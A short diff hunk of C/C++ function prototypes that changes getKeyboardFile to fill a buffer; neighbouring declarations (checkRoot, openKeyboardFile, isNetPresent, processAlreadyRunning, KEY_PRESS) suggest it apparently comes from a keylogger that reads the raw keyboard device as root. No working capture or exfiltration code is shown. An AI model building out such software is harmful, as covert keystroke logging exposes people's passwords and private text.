@@ -19,7 +19,7 @@ const int KEY_PRESS = 1;
 void printHelpText(void);
 void printVersionInfo(void);
 void checkRoot(void);
-const char *getKeyboardFile(void) noexcept;
+void getKeyboardFile(char *);
 int openKeyboardFile(void);
 const bool isNetPresent(void);
 const bool processAlreadyRunning(void);
